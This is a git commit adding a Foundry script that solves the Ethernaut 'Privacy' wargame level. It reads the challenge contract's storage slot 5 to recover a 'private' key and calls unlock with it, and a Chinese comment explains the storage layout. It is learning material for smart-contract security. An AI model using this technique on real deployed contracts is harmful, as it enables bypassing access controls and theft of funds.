2adb6e784d77d659561ec32e9fb0d9fd5b12bbd9
aronyu <h0935674938@hotmail.com>
2024-03-09 23:36:30 +0800

    12-Privacy

--- script/solutions/12-Privacy.s.sol
+++ script/solutions/12-Privacy.s.sol
@@ -16,10 +16,11 @@ contract PrivacySolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-
-        /**
-         * Understanding Solidity’s Storage Layout And How To Access State Variables In Storage Slots.
-         */
+        // https://dev.to/web3_ruud/advance-solidity-assembly-storage-slots-part-2-197e
+        // 固定長度的陣列 會直接存放在 storage slot 的接下來的位置 data 是 slot3 要取得 data[2] 就是 slot5
+        bytes32 key = vm.load(challengeInstance, bytes32(uint(5)));
+        (bool success, ) = challengeInstance.call(abi.encodeWithSignature("unlock(bytes16)", bytes16(key)));
+        require(success, "call failed");
 
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
